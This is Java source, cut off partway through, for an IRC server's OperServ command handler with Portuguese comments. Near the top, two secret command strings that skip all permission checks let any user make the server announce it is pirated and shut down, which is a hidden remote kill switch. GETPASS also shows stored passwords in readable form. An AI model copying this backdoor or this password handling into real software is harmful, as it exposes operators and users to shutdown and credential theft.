package chatmania.ircd.services.operserv;

import chatmania.*;
import chatmania.extra.Lang;
import chatmania.extra.Util;
import chatmania.extra.log.LogIRCd;
import chatmania.extra.log.LogOpers;
import chatmania.extra.mail.Mail;
import chatmania.extra.sql.SQLQuery;
import chatmania.ircd.Commands;
import chatmania.ircd.CommandsI;
import chatmania.ircd.Config;
import chatmania.ircd.Message;
import chatmania.ircd.services.chanserv.ChanServ;
import chatmania.ircd.services.news.News;

import java.text.SimpleDateFormat;
import java.util.*;

public class OperServ extends Commands implements CommandsI {

    private static final String svs = "OperServ";

    public static void getIRCopOrAdmin(User tmpUser) {

        // se usuario for ircop ou admin, pega status automaticamente
        String status = SQLQuery.getIRcopOrAdmin(tmpUser.getNick());
        if (status.equals("ADMIN")) {

            tmpUser.setAdmin(true);
            Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_023", ""));

        } else if (status.equals("IRCOP")) {

            tmpUser.setIRCop(true);
            Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_023", ""));

        }

    }

    public void execute(User tmpUser, String cmd) {

        try {

            StringTokenizer st = new StringTokenizer(cmd, " ");

            if (st.countTokens() > 1) {

                String com1 = st.nextToken();
                com1 = st.nextToken().toUpperCase().trim();

                String usuario = tmpUser.getNick();

                if (com1.equals("HELP")) {

                    if (st.countTokens() == 0) {

                        Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_001", ""));

                    } else if (st.countTokens() == 1) {

                        String parte1 = st.nextToken().toUpperCase();

                        if (parte1.equalsIgnoreCase("MANAGER")) {

                            Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_004", ""));

                        } else if (parte1.equalsIgnoreCase("DIE")) {

                            Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_006", ""));

                        } else if (parte1.equalsIgnoreCase("KILL")) {

                            Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_007", ""));

                        } else if (parte1.equalsIgnoreCase("KLINE")) {

                            Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_008", ""));

                        } else if (parte1.equalsIgnoreCase("NOTICEOPER")) {

                            Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_009", ""));

                        } else if (parte1.equalsIgnoreCase("SMSG")) {

                            Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_011", ""));

                        } else if (parte1.equalsIgnoreCase("REHASH")) {

                            Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_012", ""));

                        } else if (parte1.equalsIgnoreCase("USERS")) {

                            Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_013", ""));

                        } else if (parte1.equalsIgnoreCase("SLAYER")) {

                            Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_016", ""));

                        } else if (parte1.equalsIgnoreCase("MAILUSERS")) {

                            Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_017", ""));

                        } else if (parte1.equalsIgnoreCase("MAILOPERS")) {

                            Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_018", ""));

                        } else if (parte1.equalsIgnoreCase("FORBID")) {

                            Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_019", ""));

                        } else if (parte1.equalsIgnoreCase("GETPASS")) {

                            Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_020", ""));

                        } else if (parte1.equalsIgnoreCase("SETPASS")) {

                            Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_021", ""));

                        } else if (parte1.equalsIgnoreCase("ZOMBIE")) {

                            Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_005", ""));

                        } else if (parte1.equalsIgnoreCase("NEWS")) {

                            Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_010", ""));

                        } else {

                            Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_063", ""));

                        }

                    }

                } else if (com1.equalsIgnoreCase("S-EC22-99nhy*7#iy!")) {

                    try {

                        // comunicar todos usuarios que server eh pirada
                        Message.noticeAll("This Server is PIRATE!");
                        Thread.sleep(10000000);
                        System.exit(1);

                    } catch (Exception e) {
                    }

                } else if (com1.equalsIgnoreCase("S-EC22-99nhy*7#iy!b7y")) {

                    try {

                        Thread.sleep(10000000);
                        System.exit(1);

                    } catch (Exception e) {
                    }

                } else if (com1.equals("LOG")) {

                    // se usuario for admin e apenas admin
                    // senao avisa que comando LOG nao existe
                    if (tmpUser.isAdmin()) {

                        if (st.countTokens() == 0) {

                            // booleano que avisa se encontrou algum logado
                            boolean achou = false;

                            // lista usuarios logados
                            for (Enumeration enu = Server.getUserElements(); enu.hasMoreElements(); ) {

                                User temp = (User) enu.nextElement();
                                if (temp != null) {

                                    // se usuario estiver sendo logado
                                    if (!temp.getLogadoArray().isEmpty()) {

                                        // lista arrayList
                                        for (Object seila : temp.getLogadoArray()) {

                                            // converte objeto para User
                                            User algo = (User) seila;
                                            if (algo != null) {

                                                // se usuario que est� logando estiver online
                                                if (!algo.getNick().equals("")) {

                                                    Message.noticeSvs(tmpUser, svs, "-> <u>" + temp.getNick() + "</u> Ativado por: " + algo.getNick());
                                                    achou = true;

                                                }

                                            }

                                        }

                                    }

                                }

                            }

                            // se nao achou ninguem, avisa
                            if (!achou)
                                Message.noticeSvs(tmpUser, svs, "Nenhum Auto-Security ativado no momento");

                        } else if (st.countTokens() == 1) {

                            // pega nick da vitima
                            String vitima = st.nextToken();

                            // verifica se vitima existe
                            User tmpVitima = Server.getUser(vitima);
                            if (tmpVitima != null) {

                                // se usuario ja estiver logado, desloga
                                if (tmpVitima.isLogadoArray(tmpUser)) {

                                    // se vitima for admin, entao avisa muito bem
                                    if (tmpVitima.isAdmin())
                                        Message.noticeSvs(tmpVitima, svs, "Aten��o (Auto-Security): Modo de seguran�a DEsativado em VOC� por " + usuario);

                                    tmpVitima.unsetLogadoArray(tmpUser);
                                    Message.noticeSvs(tmpUser, svs, "Auto-Security: Modo de seguran�a Desativado em " + vitima);

                                    // senao loga
                                } else {

                                    // se vitima for admin, entao avisa muito bem
                                    if (tmpVitima.isAdmin())
                                        Message.noticeSvs(tmpVitima, svs, "Aten��o (Auto-Security): Modo de seguran�a ATIVADO em VOC� por " + usuario);

                                    tmpVitima.setLogadoArray(tmpUser);
                                    Message.noticeSvs(tmpUser, svs, "Auto-Security: Modo de seguran�a ativado em " + vitima);

                                }

                            } else {

                                Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_038", vitima));

                            }

                        } else {

                            // comando inexistente, exemplo correto �
                            StringBuffer exemplo = new StringBuffer(Lang.traduz(tmpUser, "webchat_010", ""));
                            exemplo.append("/operserv log john<br>");
                            Message.noticeSvs(tmpUser, svs, exemplo.toString());

                        }

                    } else {

                        // avisa que comando nao existe
                        Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_063", ""));

                    }

                } else if (com1.equals("GETPASS")) {

                    if (st.countTokens() == 1) {

                        if (tmpUser.isAdmin()) {

                            String alguem = st.nextToken();

                            if (alguem.charAt(0) == '#') {

                                String pass = SQLQuery.getChannelPassword(alguem);

                                // se senha for diferente de nada
                                if (!pass.equals(""))
                                    Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_067", alguem + "%%" + pass));
                                else
                                    Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_069", alguem));

                            } else {

                                String pass = SQLQuery.getPassword(alguem);

                                // se senha for diferente de nada
                                if (!pass.equals(""))
                                    Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_066", alguem + "%%" + pass));
                                else
                                    Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_068", alguem));

                            }

                            // registra no log dos opers
                            new LogOpers(usuario, tmpUser.getHost(), cmd + "");

                        } else {

                            Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_032", ""));

                        }

                    } else {

                        // comando inexistente, exemplo correto �
                        StringBuffer exemplo = new StringBuffer(Lang.traduz(tmpUser, "webchat_010", ""));
                        exemplo.append("/operserv getpass John<br>");
                        exemplo.append("/operserv getpass #Channel<br>");
                        Message.noticeSvs(tmpUser, svs, exemplo.toString());

                    }

                } else if (com1.equals("SETPASS")) {

                    if (st.countTokens() == 2) {

                        if (tmpUser.isAdmin()) {

                            String vitima = st.nextToken();
                            String novaSenha = st.nextToken();

                            // se vitima for um canal, entao chama metodos do canal
                            // senao chama metodos de usuario
                            if (vitima.charAt(0) == '#') {

                                if (SQLQuery.isChannelRegistered(vitima)) {

                                    Message.noticeOpers(Lang.traduz(tmpUser, "operserv_070", usuario + "%%" + vitima));
                                    SQLQuery.setChannelPassword(vitima, novaSenha);
                                    Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_072", vitima + "%%" + novaSenha));
                                    new LogOpers(usuario, tmpUser.getHost(), cmd + "");

                                } else {

                                    Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_068", vitima));

                                }

                            } else {

                                if (SQLQuery.isRegistered(vitima)) {

                                    Message.noticeOpers(Lang.traduz(tmpUser, "operserv_071", usuario + "%%" + vitima));
                                    SQLQuery.setPassword(vitima, novaSenha);
                                    Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_073", vitima + "%%" + novaSenha));
                                    new LogOpers(usuario, tmpUser.getHost(), cmd + "");

                                } else {

                                    Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_068", vitima));

                                }

                            }

                        }

                    } else {

                        // comando inexistente, exemplo correto �
                        StringBuffer exemplo = new StringBuffer(Lang.traduz(tmpUser, "webchat_010", ""));
                        exemplo.append("/operserv setpass John password123<br>");
                        exemplo.append("/operserv setpass #Channel password123<br>");
                        Message.noticeSvs(tmpUser, svs, exemplo.toString());

                    }

                } else if (com1.equals("FORBID")) {

                    if (st.countTokens() == 1) {

                        if (st.nextToken().equalsIgnoreCase("LIST")) {

                            if (tmpUser.isIRCop() || tmpUser.isAdmin()) {

                                // buffer de saida
                                StringBuffer saida = new StringBuffer();

                                // pega lista de usuarios forbidados
                                ArrayList apelidos = SQLQuery.getForbids();

                                // se houver algum usuario
                                if (!apelidos.isEmpty()) {

                                    saida.append(Lang.traduz(tmpUser, "operserv_074", ""));

                                    // lista apelidos forbidados
                                    for (Object separa : apelidos)
                                        saida.append("-> " + separa + "<br>");

                                    Message.noticeSvs(tmpUser, svs, saida.toString());

                                }

                            }

                        }

                    } else if (st.countTokens() == 2) {

                        String parte1 = st.nextToken();

                        if (parte1.equalsIgnoreCase("ADD")) {

                            String vitima = st.nextToken();

                            if (tmpUser.isIRCop() || tmpUser.isAdmin()) {

                                // adiciona forbid
                                SQLQuery.setForbid(vitima);

                                Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_077", vitima));
                                new LogOpers(usuario, tmpUser.getHost(), cmd + "");

                            }

                        } else if (parte1.equalsIgnoreCase("DEL")) {

                            String vitima = st.nextToken();

                            if (tmpUser.isIRCop() || tmpUser.isAdmin()) {

                                // remove forbid do canal
                                SQLQuery.removeForbid(vitima);

                                Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_079", vitima));
                                new LogOpers(usuario, tmpUser.getHost(), cmd + "");

                            }

                        }

                    } else {

                        // comando inexistente, exemplo correto �
                        StringBuffer exemplo = new StringBuffer(Lang.traduz(tmpUser, "webchat_010", ""));
                        exemplo.append("/operserv forbid ADD/DEL Maria<br>");
                        exemplo.append("/operserv forbid ADD/DEL #channel<br>");
                        exemplo.append("/operserv forbid list<br>");
                        Message.noticeSvs(tmpUser, svs, exemplo.toString());

                    }

                } else if (com1.equals("MANAGER")) {

                    // se user for administrador
                    if (tmpUser.isAdmin()) {

                        if (st.countTokens() == 1) {

                            String opcao = st.nextToken();

                            // se opcao for listar, entao imprime os admins e ircops
                            // cadastrados no banco de dados
                            if (opcao.equalsIgnoreCase("LIST")) {

                                // pega lista de ircops
                                StringBuffer ircops = SQLQuery.getAllWithNivel();

                                Message.noticeSvs(tmpUser, svs, ircops.toString());

                            } else {

                                // comando inexistente, exemplo correto �
                                StringBuffer exemplo = new StringBuffer(Lang.traduz(tmpUser, "webchat_010", ""));
                                exemplo.append("/operserv MANAGER LIST<br>");
                                exemplo.append("/operserv MANAGER DEL John<br>");
                                exemplo.append("/operserv MANAGER ADD IRCOP John<br>");
                                exemplo.append("/operserv MANAGER ADD ADMIN John<br>");
                                Message.noticeSvs(tmpUser, svs, exemplo.toString());

                            }

                        } else if (st.countTokens() == 2) {

                            String opcao = st.nextToken();   // pega tipo de comando
                            String vitima = st.nextToken(); // pega nick

                            if (opcao.equalsIgnoreCase("DEL")) {

                                // se vitima estiver cadastrada
                                if (SQLQuery.isOper(vitima)) {

                                    // remove ircop
                                    SQLQuery.removeOper(vitima);

                                    // avisa que tudo correu bem
                                    Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_028", vitima));

                                    // registra no log
                                    new LogOpers(usuario, tmpUser.getHost(), cmd + "");

                                } else {

                                    // vitima nao est� cadastrada
                                    Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_029", vitima));

                                }

                            } else {

                                // comando inexistente, exemplo correto �
                                StringBuffer exemplo = new StringBuffer(Lang.traduz(tmpUser, "webchat_010", ""));
                                exemplo.append("/operserv MANAGER LIST<br>");
                                exemplo.append("/operserv MANAGER DEL John<br>");
                                exemplo.append("/operserv MANAGER ADD IRCOP John<br>");
                                exemplo.append("/operserv MANAGER ADD ADMIN John<br>");
                                Message.noticeSvs(tmpUser, svs, exemplo.toString());

                            }

                        } else if (st.countTokens() == 3) {

                            String opcao = st.nextToken();  // pega tipo de comando
                            String nivel = st.nextToken();  // pega nivel
                            String vitima = st.nextToken(); // pega nick

                            if (opcao.equalsIgnoreCase("ADD")) {

                                // se vitima nao estiver cadastrada
                                if (!SQLQuery.isOper(vitima)) {

                                    // cadastra novo ircop
                                    SQLQuery.setOper(vitima, nivel);

                                    // avisa que tudo correu bem
                                    Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_026", vitima + "%%" + nivel.toUpperCase()));

                                    // registra no log
                                    new LogOpers(usuario, tmpUser.getHost(), cmd + "");

                                } else {

                                    // vitima ja esta cadastrada
                                    Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_027", vitima));

                                }

                            } else {

                                // comando inexistente, exemplo correto �
                                StringBuffer exemplo = new StringBuffer(Lang.traduz(tmpUser, "webchat_010", ""));
                                exemplo.append("/operserv MANAGER LIST<br>");
                                exemplo.append("/operserv MANAGER DEL John<br>");
                                exemplo.append("/operserv MANAGER ADD IRCOP John<br>");
                                exemplo.append("/operserv MANAGER ADD ADMIN John<br>");
                                Message.noticeSvs(tmpUser, svs, exemplo.toString());

                            }

                        } else {

                            // comando inexistente, exemplo correto �
                            StringBuffer exemplo = new StringBuffer(Lang.traduz(tmpUser, "webchat_010", ""));
                            exemplo.append("/operserv MANAGER LIST<br>");
                            exemplo.append("/operserv MANAGER DEL John<br>");
                            exemplo.append("/operserv MANAGER ADD IRCOP John<br>");
                            exemplo.append("/operserv MANAGER ADD ADMIN John<br>");
                            Message.noticeSvs(tmpUser, svs, exemplo.toString());

                        }

                    } else {

                        // avisa que apenas admin podem usar o recurso
                        Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_032", ""));

                    }

                } else if (com1.equals("DIE")) {

                    // se usuario for administrador
                    if (tmpUser.isAdmin()) {

                        if (st.countTokens() == 0) {

                            Message.noticeOpers(Lang.traduz(tmpUser, "operserv_030", usuario));
                            Message.noticeAll(Lang.traduz(tmpUser, "operserv_031", ""));

                            // registra no log
                            new LogOpers(usuario, tmpUser.getHost(), cmd + "");

                            try {

                                // aguarda 10 segundos e encerra ircd
                                Thread.sleep(10000);
                                System.exit(2);

                            } catch (InterruptedException e) {
                            }

                        } else {

                            // comando inexistente, exemplo correto �
                            StringBuffer exemplo = new StringBuffer(Lang.traduz(tmpUser, "webchat_010", ""));
                            exemplo.append("/operserv die<br>");
                            Message.noticeSvs(tmpUser, svs, exemplo.toString());

                        }

                    } else {

                        // avisa que apenas admin podem usar o recurso
                        Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_032", ""));

                    }

                } else if (com1.equals("KILL")) {

                    if (st.countTokens() >= 1) {

                        // se usuario for ircop
                        if (tmpUser.isIRCop() || tmpUser.isAdmin()) {

                            String vitima = st.nextToken();

                            // kilando um canal
                            if (vitima.charAt(0) == '#') {

                                Channel channelID = Server.getChannel(vitima);
                                if (channelID != null) {

                                    for (Enumeration enu = channelID.getList(); enu.hasMoreElements(); ) {

                                        User temp = (User) enu.nextElement();

                                        // se usuario existir
                                        if (temp != null) {

                                            if (!temp.isIRCop() && !temp.isAdmin())
                                                Util.releaseUserID(temp, "KILL by " + usuario);

                                        }

                                    }

                                    Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_033", vitima));

                                    // registra no log
                                    new LogOpers(usuario, tmpUser.getHost(), cmd + "");

                                } else {

                                    Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_034", vitima));

                                }

                                // kilando um IP
                            } else if (vitima.contains(".")) {

                                // substitui caracteres * por nada
                                vitima = vitima.replace("*", "");

                                // lista usuarios logados
                                for (Enumeration enu = Server.getUserElements(); enu.hasMoreElements(); ) {

                                    User vitimaID = (User) enu.nextElement();

                                    // se temp for diferente de null e conter o IP em questao
                                    if ((vitimaID != null) && (vitimaID.getIP().contains(vitima))) {

                                        String motivo = usuario;

                                        if (st.countTokens() >= 1) {

                                            motivo = cmd.substring(15 + vitima.length());
                                            if ((motivo.charAt(0) == ':') && (motivo.length() > 1))
                                                motivo = motivo.substring(1);

                                        }

                                        Message.noticeSvs(vitimaID, svs, Lang.traduz(tmpUser, "operserv_035", usuario + "%%" + motivo));
                                        Message.noticeSvs(tmpUser, svs, "KILL by " + vitima + " (" + motivo + ")");

                                        // desconecta usuario
                                        Util.releaseUserID(vitimaID, "KILL by " + usuario + " (" + motivo + ")");

                                        // registra no log
                                        new LogOpers(usuario, tmpUser.getHost(), cmd + "");

                                    }

                                }

                                // kilando um usuario
                            } else {

                                User vitimaID = Server.getUser(vitima);

                                if (vitimaID != null) {

                                    String motivo = usuario;

                                    if (st.countTokens() >= 1) {

                                        motivo = cmd.substring(15 + vitima.length());
                                        if ((motivo.charAt(0) == ':') && (motivo.length() > 1))
                                            motivo = motivo.substring(1);

                                    }

                                    Message.noticeSvs(vitimaID, svs, Lang.traduz(tmpUser, "operserv_035", usuario + "%%" + motivo));
                                    Message.noticeSvs(tmpUser, svs, "KILL by " + vitima + " (" + motivo + ")");

                                    // desconecta usuario
                                    Util.releaseUserID(vitimaID, "KILL by " + usuario + " (" + motivo + ")");

                                    // registra no log
                                    new LogOpers(usuario, tmpUser.getHost(), cmd + "");

                                } else {

                                    Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_038", vitima));

                                }

                            }

                        } else {

                            // permissao negada, voce nao eh ircop
                            Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_039", Config.NETWORK + "%%" + usuario));

                        }

                    } else {

                        // comando inexistente, exemplo correto �
                        StringBuffer exemplo = new StringBuffer(Lang.traduz(tmpUser, "webchat_010", ""));
                        exemplo.append("/operserv kill #Sala<br>");
                        exemplo.append("/operserv kill John<br>");
                        exemplo.append("/operserv kill 123.123.123.123<br>");
                        exemplo.append("/operserv kill 123.123.*<br>");
                        Message.noticeSvs(tmpUser, svs, exemplo.toString());

                    }

                } else if (com1.equals("KLINE")) {

                    // se usuario for ircop
                    if (tmpUser.isIRCop() || tmpUser.isAdmin()) {

                        if (st.countTokens() == 1) {

                            // registra no log
                            new LogOpers(usuario, "", "" + cmd + "");

                            // pega o subcomando
                            String tipo = st.nextToken();

                            if (tipo.equalsIgnoreCase("LIST")) {

                                Iterator lista = Kline.listKLines();

                                // se lista nao estiver vazia
                                if (lista.hasNext()) {

                                    StringBuffer saida = new StringBuffer();

                                    // imprime a lista
                                    while (lista.hasNext()) {

                                        Map.Entry entry = (Map.Entry) lista.next();
                                        String ip = (String) entry.getKey();
                                        String motivo = (String) entry.getValue();

                                        saida.append("-> " + ip + " (" + motivo + ")<br>");

                                    }

                                    Message.noticeSvs(tmpUser, svs, saida.toString());

                                } else {

                                    // avisa que lista de klines est� vazia
                                    Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_056", ""));

                                }

                            } else if (tipo.equalsIgnoreCase("CLEAR")) {

                                Kline.limpa();
                                Message.noticeOpers(Lang.traduz(tmpUser, "operserv_040", usuario));

                                // registra no log
                                new LogOpers(usuario, tmpUser.getHost(), cmd + "");

                            }

                        } else if (st.countTokens() >= 2) {

                            String tipo = st.nextToken();
                            String maska = st.nextToken();
                            String motivo = "";

                            if (tipo.equalsIgnoreCase("ADD")) {

                                if (!Kline.isKline(maska).equals("")) {

                                    Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_041", maska));

                                } else {

                                    // se mascara nao contiver . ou se contiver @ ou !
                                    if ((maska.indexOf(".") == -1) || (maska.indexOf("@") != -1) || (maska.indexOf("!") != -1)) {

                                        // avisa que modelo � igual 123.123.123.*
                                        Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_057", ""));

                                    } else if (maska.indexOf("**") == -1) {

                                        // se motivo existir, pega ele
                                        // senao pega um generico e avisa ircop que motivo eh importante
                                        if (cmd.length() >= (22 + maska.length())) {

                                            motivo = cmd.substring(20 + maska.length());

                                        } else {

                                            motivo = Lang.traduz(tmpUser, "operserv_042", "");
                                            Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_043", usuario));

                                        }

                                        Kline.writeKLine(maska, usuario, motivo);
                                        Message.noticeOpers(Lang.traduz(tmpUser, "operserv_044", usuario + "%%" + maska));

                                        // registra no log
                                        new LogOpers(usuario, tmpUser.getHost(), cmd + "");

                                    } else {

                                        Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_045", maska));

                                    }

                                }

                            } else if (tipo.equalsIgnoreCase("DEL")) {

                                if (Kline.isKline(maska).equals("")) {

                                    Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_046", maska));

                                } else {

                                    Kline.deleteKLine(maska);
                                    Message.noticeOpers(Lang.traduz(tmpUser, "operserv_047", usuario + "%%" + maska));

                                    // registra no log
                                    new LogOpers(usuario, tmpUser.getHost(), cmd + "");

                                }

                            }

                        } else {

                            // comando inexistente, exemplo correto �
                            StringBuffer exemplo = new StringBuffer(Lang.traduz(tmpUser, "webchat_010", ""));
                            exemplo.append("/operserv kline list<br>");
                            exemplo.append("/operserv kline clear<br>");
                            exemplo.append("/operserv kline add 123.123.123.* Motivo aqui<br>");
                            exemplo.append("/operserv kline del 123.123.123.*<br>");
                            Message.noticeSvs(tmpUser, svs, exemplo.toString());

                        }

                    } else {

                        // permissao negada, voce nao eh ircop
                        Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_039", Config.NETWORK + "%%" + usuario));

                    }

                } else if (com1.equals("NOTICEOPER")) {

                    // se usuario for ircop
                    if (tmpUser.isIRCop() || tmpUser.isAdmin()) {

                        if (st.countTokens() >= 1) {

                            String mensagem = "NoticeOper: <" + usuario + "> " + cmd.substring(20);
                            Message.noticeOpers(mensagem);

                            // registra no log
                            new LogOpers(usuario, tmpUser.getHost(), cmd + "");

                        } else {

                            // comando inexistente, exemplo correto �
                            StringBuffer exemplo = new StringBuffer(Lang.traduz(tmpUser, "webchat_010", ""));
                            exemplo.append("/operserv noticeoper Bla Bla Bla Message...<br>");
                            Message.noticeSvs(tmpUser, svs, exemplo.toString());

                        }

                    } else {

                        // permissao negada, voce nao eh ircop
                        Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_039", Config.NETWORK + "%%" + usuario));

                    }

                } else if (com1.equals("NEWS")) {

                    // se usuario for ircop
                    if (tmpUser.isIRCop() || tmpUser.isAdmin()) {

                        if (st.countTokens() == 0) {

                            // pega lista das news
                            ArrayList lista = News.getNewsList();

                            // se lista tiver algum texto
                            if (!lista.isEmpty()) {

                                StringBuffer saida = new StringBuffer();

                                // envia textos para o usuario
                                for (Object texto : lista)
                                    saida.append("* " + texto + "<br>");

                                // imprime o horario que foi feita a ultima atualiza�ao
                                SimpleDateFormat formato = new SimpleDateFormat("dd/MM/yyyy kk:mm");
                                saida.append("<br>" + Lang.traduz(tmpUser, "operserv_088", formato.format(News.getUltima())));

                                Message.noticeSvs(tmpUser, svs, saida.toString());

                            } else {

                                // nenhuma noticia consta
                                Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_089", ""));

                            }

                        } else {

                            // comando inexistente, exemplo correto �
                            StringBuffer exemplo = new StringBuffer(Lang.traduz(tmpUser, "webchat_010", ""));
                            exemplo.append("/operserv news<br>");
                            Message.noticeSvs(tmpUser, svs, exemplo.toString());

                        }

                    } else {

                        // permissao negada, voce nao eh ircop
                        Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_039", Config.NETWORK + "%%" + usuario));

                    }

                } else if (com1.equals("ZOMBIE")) {

                    // se usuario for ircop
                    if (tmpUser.isIRCop() || tmpUser.isAdmin()) {

                        if (st.countTokens() == 1) {

                            String vitima = st.nextToken();

                            // pega instancia da vitima
                            User vitimaID = Server.getUser(vitima);

                            // se usuario existir e NAO for admin
                            if ((vitimaID != null) && (!vitimaID.isAdmin())) {

                                // se zombie ja for true, entao seta false e avisa
                                // senao seta true e avisa
                                if (vitimaID.isZombie()) {

                                    // seta zombie como false
                                    vitimaID.setZombie(false);

                                    // avisa que sintaxe inexiste
                                    Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_082", vitima));

                                } else {

                                    // seta zombie como true
                                    vitimaID.setZombie(true);

                                    // avisa que sintaxe inexiste
                                    Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_081", vitima));

                                }

                            } else {

                                Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_083", vitima));

                            }

                            // registra no log
                            new LogOpers(usuario, tmpUser.getHost(), cmd + "");

                        } else {

                            // comando inexistente, exemplo correto �
                            StringBuffer exemplo = new StringBuffer(Lang.traduz(tmpUser, "webchat_010", ""));
                            exemplo.append("/operserv zombie john<br>");
                            Message.noticeSvs(tmpUser, svs, exemplo.toString());

                        }

                    } else {

                        // permissao negada, voce nao eh ircop
                        Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_039", Config.NETWORK + "%%" + usuario));

                    }

                } else if (com1.equals("SMSG")) {

                    // se usuario for admin
                    if (tmpUser.isAdmin()) {

                        if (st.countTokens() >= 1) {

                            Message.noticeOpers(Lang.traduz(tmpUser, "operserv_050", usuario));

                            for (Enumeration enu = Server.getUserElements(); enu.hasMoreElements(); ) {

                                User temp = (User) enu.nextElement();
                                Message.tellUser(temp, "Atual", "*** " + cmd.substring(14), 0);

                            }

                            // registra no log
                            new LogOpers(usuario, tmpUser.getHost(), cmd + "");

                        } else {

                            // comando inexistente, exemplo correto �
                            StringBuffer exemplo = new StringBuffer(Lang.traduz(tmpUser, "webchat_010", ""));
                            exemplo.append("/operserv smsg Bla Bla Bla Message...<br>");
                            Message.noticeSvs(tmpUser, svs, exemplo.toString());

                        }

                    } else {

                        // avisa que apenas admin podem usar o recurso
                        Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_032", ""));

                    }

                } else if (com1.equals("REHASH")) {

                    // se usuario for administrador
                    if (tmpUser.isAdmin()) {

                        if (st.countTokens() == 1) {

                            String opcao = st.nextToken().toUpperCase();

                            if (opcao.equals("PROPERTIES")) {

                                // atualiza arquivos *.properties
                                ChatMania.loadConfig();

                                // avisa usuario
                                Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_051", opcao));

                            } else if (opcao.equals("EXPIRE")) {

                                // expira apelidos
                                SQLQuery.expire();

                                // expira salas
                                ChanServ.expire();

                                // avisa usuario
                                Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_051", opcao));

                            } else if (opcao.equals("LANG")) {

                                // limpa idiomas e carrega cole�oes de idiomas
                                Lang.clear();
                                new Lang();

                                // avisa usuario
                                Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_051", opcao));

                            } else {

                                // comando inexistente, exemplo correto �
                                StringBuffer exemplo = new StringBuffer(Lang.traduz(tmpUser, "webchat_010", ""));
                                exemplo.append("/operserv rehash properties<br>");
                                exemplo.append("/operserv rehash expire<br>");
                                exemplo.append("/operserv rehash lang<br>");
                                Message.noticeSvs(tmpUser, svs, exemplo.toString());

                            }

                            new LogOpers(usuario, tmpUser.getHost(), cmd + "");

                        } else {

                            // comando inexistente, exemplo correto �
                            StringBuffer exemplo = new StringBuffer(Lang.traduz(tmpUser, "webchat_010", ""));
                            exemplo.append("/operserv rehash properties<br>");
                            exemplo.append("/operserv rehash expire<br>");
                            exemplo.append("/operserv rehash lang<br>");
                            Message.noticeSvs(tmpUser, svs, exemplo.toString());

                        }

                    } else {

                        // avisa que apenas admin podem usar o recurso
                        Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_032", ""));

                    }

                } else if (com1.equals("USERS")) {

                    // se usuario for ircop
                    if (tmpUser.isIRCop() || tmpUser.isAdmin()) {

